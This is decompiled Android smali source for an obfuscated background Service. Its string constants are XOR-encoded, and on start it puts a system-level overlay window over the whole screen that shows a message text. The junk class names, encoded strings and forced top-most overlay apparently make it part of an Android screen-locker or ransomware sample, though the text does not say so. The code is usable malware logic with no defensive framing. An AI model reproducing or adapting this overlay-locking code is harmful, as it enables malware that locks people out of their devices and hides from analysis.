.class public Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;
.super Landroid/app/Service;


# static fields
.field private static final a:[Ljava/lang/String;

.field public static e:Z


# instance fields
.field private b:Landroid/widget/TextView;

.field c:Landroid/view/View;

.field d:Landroid/view/WindowManager;

.field private f:Landroid/widget/ImageView;


# direct methods
.method static constructor <clinit>()V
    .locals 14

    const/4 v2, 0x1

    const/4 v1, 0x0

    const/4 v0, 0x3

    new-array v4, v0, [Ljava/lang/String;

    const-string v3, "\u0012\'\u0015\u0012V\u0012"

    const/4 v0, -0x1

    move-object v5, v4

    move-object v6, v4

    move v4, v1

    :goto_0
    invoke-virtual {v3}, Ljava/lang/String;->toCharArray()[C

    move-result-object v3

    array-length v7, v3

    if-gt v7, v2, :cond_2

    move v8, v1

    :cond_0
    move-object v9, v3

    move v10, v8

    move v13, v7

    move-object v7, v3

    move v3, v13

    :goto_1
    aget-char v12, v7, v8

    rem-int/lit8 v11, v10, 0x5

    packed-switch v11, :pswitch_data_0

    const/16 v11, 0x39

    :goto_2
    xor-int/2addr v11, v12

    int-to-char v11, v11

    aput-char v11, v7, v8

    add-int/lit8 v8, v10, 0x1

    if-nez v3, :cond_1

    move-object v7, v9

    move v10, v8

    move v8, v3

    goto :goto_1

    :cond_1
    move v7, v3

    move-object v3, v9

    :goto_3
    if-gt v7, v8, :cond_0

    new-instance v7, Ljava/lang/String;

    invoke-direct {v7, v3}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v7}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v3

    packed-switch v0, :pswitch_data_1

    aput-object v3, v5, v4

    const-string v0, "E#\u000e\u0005ME,\u001eVX\u0006:\u0012\u0000X\u0011+\u001f"

    move-object v3, v0

    move v4, v2

    move-object v5, v6

    move v0, v1

    goto :goto_0

    :pswitch_0
    aput-object v3, v5, v4

    const/4 v3, 0x2

    const-string v0, "\t/\u0002\u0019L\u0011\u0011\u0012\u0018_\t/\u000f\u0013K"

    move v4, v3

    move-object v5, v6

    move-object v3, v0

    move v0, v2

    goto :goto_0

    :pswitch_1
    aput-object v3, v5, v4

    sput-object v6, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->a:[Ljava/lang/String;

    return-void

    :pswitch_2
    const/16 v11, 0x65

    goto :goto_2

    :pswitch_3
    const/16 v11, 0x4e

    goto :goto_2

    :pswitch_4
    const/16 v11, 0x7b

    goto :goto_2

    :pswitch_5
    const/16 v11, 0x76

    goto :goto_2

    :cond_2
    move v8, v1

    goto :goto_3

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private b()V
    .locals 2

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->c:Landroid/view/View;

    const v1, 0x7f090025

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ImageView;

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->f:Landroid/widget/ImageView;

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->c:Landroid/view/View;

    const v1, 0x7f090026

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->b:Landroid/widget/TextView;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 7

    const/16 v3, 0x7da

    const/4 v1, -0x1

    const/4 v2, -0x2

    const/4 v5, -0x3

    :try_start_0
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/z;

    invoke-direct {v0}, Lzvy/zpfypq/bbuhtkwvaf/z;-><init>()V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v6, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;

    invoke-virtual {v0, v4, v6}, Lzvy/zpfypq/bbuhtkwvaf/z;->a(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/s;->a:Ljava/lang/String;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v0, v4}, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;->a(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->stopSelf()V
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x17

    if-lt v0, v4, :cond_1

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const v4, 0x482108

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    move-object v1, v0

    :goto_0
    const/16 v0, 0x30

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->a:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v0, v0, v2

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->d:Landroid/view/WindowManager;

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->a:[Ljava/lang/String;

    const/4 v2, 0x2

    aget-object v0, v0, v2

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    const v2, 0x7f030002

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->c:Landroid/view/View;

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->d:Landroid/view/WindowManager;

    iget-object v2, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->c:Landroid/view/View;

    invoke-interface {v0, v2, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-direct {p0}, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->b()V

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->b:Landroid/widget/TextView;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const v2, 0x7f070001

    invoke-virtual {p0, v2}, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->a:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    return-void

    :catch_0
    move-exception v0

    throw v0

    :cond_1
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const v4, 0x82188

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    move-object v1, v0

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 2

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    :try_start_0
    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->d:Landroid/view/WindowManager;

    iget-object v1, p0, Lzvy/zpfypq/bbuhtkwvaf/IllllIllIlILllIIllIIIIIllllIlLlllllIllllLIIllIlIIllIIllL;->c:Landroid/view/View;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeViewImmediate(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method
